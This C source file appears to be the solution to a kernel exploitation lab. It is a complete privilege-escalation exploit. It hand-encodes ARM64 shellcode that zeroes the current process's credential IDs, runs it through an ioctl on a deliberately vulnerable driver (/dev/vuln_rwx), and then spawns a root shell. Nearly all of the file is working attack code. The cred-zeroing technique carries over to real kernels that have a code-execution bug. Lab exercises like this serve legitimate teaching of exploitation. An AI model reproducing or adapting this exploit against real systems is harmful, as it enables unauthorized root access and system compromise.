/*
 * raw_privesc_solution.c - SOLUTION: Direct cred-zeroing privesc
 *
 * Complete reference implementation. 7 instructions, 28 bytes.
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>

#include "offsets.h"

/*
 * Allow runtime override via environment variables.
 * If CRED_OFFSET_ENV / UID_OFFSET_ENV are set, use those.
 * Otherwise fall back to compile-time offsets.h values.
 */
static int cred_offset;
static int uid_offset;

static void resolve_offsets(void)
{
	const char *env;

	env = getenv("CRED_OFF");
	cred_offset = env ? (int)strtol(env, NULL, 0) : CRED_OFFSET;

	env = getenv("UID_OFF");
	uid_offset = env ? (int)strtol(env, NULL, 0) : UID_OFFSET;
}

struct vuln_rwx_request {
	void *code;
	size_t len;
};
#define VULN_RWX_EXEC _IOW('R', 1, struct vuln_rwx_request)

static uint32_t encode_mrs_sp_el0(int rt)
{
	return 0xD5384100 | rt;
}

static uint32_t encode_ldr_imm(int rt, int rn, int offset)
{
	uint32_t imm12 = offset / 8;
	return 0xF9400000 | (imm12 << 10) | (rn << 5) | rt;
}

/*
 * stur xzr, [Xn, #simm9]
 *
 * Unscaled 64-bit store of zero. Unlike the regular str (which requires
 * the offset to be a multiple of 8), stur accepts any byte offset in
 * the range [-256, 255]. This matters when uid is not 8-byte aligned
 * (e.g., offset 0x04 in our lab kernel).
 *
 * Encoding: 11_111_000_00_0_imm9_00_Rn_Rt  ->  0xF8000000 | ...
 */
static uint32_t encode_stur_xzr(int rn, int offset)
{
	uint32_t imm9 = (uint32_t)offset & 0x1FF;
	return 0xF8000000 | (imm9 << 12) | (rn << 5) | 31;
}

static uint32_t encode_ret(void)
{
	return 0xD65F03C0;
}

static int build_shellcode(uint32_t *buf)
{
	int i = 0;

	/* 1. Get current task_struct pointer from SP_EL0 */
	buf[i++] = encode_mrs_sp_el0(0);          /* mrs x0, sp_el0 */

	/* 2. Chase cred pointer: x0 = current->cred */
	buf[i++] = encode_ldr_imm(0, 0, cred_offset);

	/* 3. Zero uid + gid */
	buf[i++] = encode_stur_xzr(0, uid_offset);

	/* 4. Zero suid + sgid */
	buf[i++] = encode_stur_xzr(0, uid_offset + 8);

	/* 5. Zero euid + egid */
	buf[i++] = encode_stur_xzr(0, uid_offset + 16);

	/* 6. Zero fsuid + fsgid */
	buf[i++] = encode_stur_xzr(0, uid_offset + 24);

	/* 7. Return to driver */
	buf[i++] = encode_ret();

	return i;
}

int main(void)
{
	uint32_t shellcode[16];
	int fd, count;
	struct vuln_rwx_request req;

	printf("[*] Raw cred-zeroing exploit (no kallsyms needed)\n");

	resolve_offsets();

	if (cred_offset == 0 || uid_offset == 0) {
		fprintf(stderr, "[-] No offsets! Set CRED_OFF / UID_OFF env vars,\n");
		fprintf(stderr, "    or fill in offsets.h and rebuild.\n");
		fprintf(stderr, "    Run: insmod find_offsets.ko && dmesg | tail\n");
		return 1;
	}

	printf("[*] Using offsets: cred=0x%x, uid=0x%x\n",
	       cred_offset, uid_offset);

	count = build_shellcode(shellcode);
	printf("[*] Shellcode: %d instructions (%zu bytes)\n",
	       count, count * sizeof(uint32_t));

	fd = open("/dev/vuln_rwx", O_RDWR);
	if (fd < 0) {
		perror("open /dev/vuln_rwx");
		return 1;
	}

	req.code = shellcode;
	req.len  = count * sizeof(uint32_t);

	printf("[*] Sending %zu bytes to /dev/vuln_rwx...\n", req.len);

	if (ioctl(fd, VULN_RWX_EXEC, &req) < 0) {
		perror("ioctl VULN_RWX_EXEC");
		close(fd);
		return 1;
	}
	close(fd);

	if (getuid() == 0) {
		printf("[+] SUCCESS: uid=0 (root)\n");
		printf("[*] Spawning root shell...\n");
		fflush(stdout);
		execl("/bin/sh", "sh", NULL);
	} else {
		printf("[-] FAILED: uid=%d (not root)\n", getuid());
		return 1;
	}

	return 0;
}
